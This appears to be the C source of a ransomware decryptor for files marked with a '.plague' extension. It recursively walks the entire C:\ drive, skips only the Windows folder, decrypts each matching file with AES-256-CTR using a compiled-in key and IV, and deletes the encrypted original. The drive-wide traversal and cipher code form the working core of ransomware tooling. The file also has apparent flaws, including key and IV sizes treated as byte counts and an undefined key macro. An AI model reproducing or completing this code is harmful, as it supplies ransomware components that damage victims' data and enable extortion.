
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/rand.h>
#include <openssl/modes.h>
#include <openssl/rsa.h>

#define KEY_SIZE    256
#define IV_SIZE     128
#define EXTENSION   ".plague"

char *strndup(const char *s, size_t n) {
    char *p = memchr(s, '\0', n);
    if (p != NULL)
        n = p - s;
    p = malloc(n + 1);
    if (p != NULL) {
        memcpy(p, s, n);
        p[n] = '\0';
    }
    return p;
}

void handleError()
{
    unsigned long errCode;

    while ((errCode = ERR_get_error()))
    {
        char *err = ERR_error_string(errCode, NULL);
        printf("%s\n", err);
    }
    abort();
}

unsigned char    *decode_hex(char *hex, int size)
{
    unsigned char *decoded_key;
    char *tmp;
    int i = 0;

    if (!(decoded_key = malloc(((KEY_SIZE) + 1) * sizeof(char))))
        handleError();
    if (!(tmp = malloc((3) * sizeof(char))))
        handleError();
    while (i < size)
    {
        tmp = strncpy(tmp, hex + (i * 2), 2);
        tmp[2] = 0;
        decoded_key[i] = (char)strtol(tmp, NULL, 16);
        i++;
    }
    decoded_key[i] = 0;
    if (tmp)
        free(tmp);
    return decoded_key;
}

char *str_concat(int nb_arg, ...) {
    int i;
    char *path;
    char *tmp;
    va_list ap;

    va_start(ap, nb_arg);
    if (!(path = malloc(1)))
        return NULL;
    *path = '\0';
    for (i = 0; i < nb_arg; i++) {
        tmp = va_arg(ap, char *);
        if (!(path = realloc(path, strlen(path) + strlen(tmp) + 1)))
            return NULL;
        path = strcat(path, tmp);
    }
    va_end(ap);
    return path;
}

int in_whitelist(char *str)
{
  char *whitelist[] = {"..", ".", "Windows", 0};

  for (int i = 0; whitelist[i] ; i++)
    if (strcmp(whitelist[i], str) == 0)
      return 1;
  return 0;
}

int endWith(const char *str, const char *suffix)
{
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix >  lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

void apply_for_all(const char *path, void (*fct)(unsigned char [], unsigned char [], const char *), unsigned char key[], unsigned char iv[])
{
    DIR *d;
    struct dirent *dir;
    struct stat s;
    char *str = NULL;

    if (path && (d = opendir(path)))
    {
        while ((dir = readdir(d)) != NULL)
        {
            if (in_whitelist(dir->d_name))
                continue;
            str = str_concat(3, path, "\\", dir->d_name);               // Windows
            if ((stat(str, &s) == 0) && (s.st_mode & S_IFDIR))
                apply_for_all(str, fct, key, iv);
            else
                fct(key, iv, str);
            free(str);
            str = NULL;
        }
        closedir(d);
    }
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create and initialise the context.
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleError();

    // Initialise the decryption operation with 256 key size and 128 bits IV size.
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv))
        handleError();

    // Provide the message to be decrypted, and obtain the plaintext output.
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleError();
    plaintext_len = len;

    // Finalise the decryption.
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleError();
    plaintext_len += len;

    // Free.
    EVP_CIPHER_CTX_free(ctx);
    return plaintext_len;
}

void decrypt_file(unsigned char key[], unsigned char iv[], const char *path)
{
    unsigned char encrypted_text[128];
    unsigned char decrypted_text[128];
    char *decrypted_filename;
    unsigned int size;
    char *substring;
    int index;
    FILE *fd, *decrypted_fd;

    if (!(endWith(path, EXTENSION)))
        return ;
    if (!(fd = fopen(path, "rb")))
        return ;
    index = strlen(path) - strlen(EXTENSION);
    decrypted_filename = strndup(path, index);
    if (!(decrypted_fd = fopen(decrypted_filename, "wb")))
    {
        fclose(fd);
        return ;
    }
    while ((size = fread(encrypted_text, 1, sizeof(encrypted_text), fd)) > 0)
    {
        decrypt(encrypted_text, (int)size, key, iv, decrypted_text); // Encrypt the text
        fwrite(decrypted_text, 1, size, decrypted_fd);
    }
    fclose(decrypted_fd);
    fclose(fd);
    free(decrypted_filename);
    remove(path);
}

int main()
{
    char *path = strdup("C:\\");                                  // Windows
    unsigned char *decoded_key, *decoded_iv;

    decoded_key = decode_hex(ENCODED_KEY, KEY_SIZE);
    decoded_iv = decode_hex(ENCODED_IV, IV_SIZE);
    apply_for_all(path, &decrypt_file, decoded_key, decoded_iv);

    free(path);
    memset(decoded_key, 0, KEY_SIZE);                                   // Erase memory where was store the key
    memset(decoded_iv, 0, IV_SIZE);                                   // Erase memory where was store the key
    free(decoded_key);
    free(decoded_iv);
    system("PAUSE");                                             // Windows
    return 0;
}

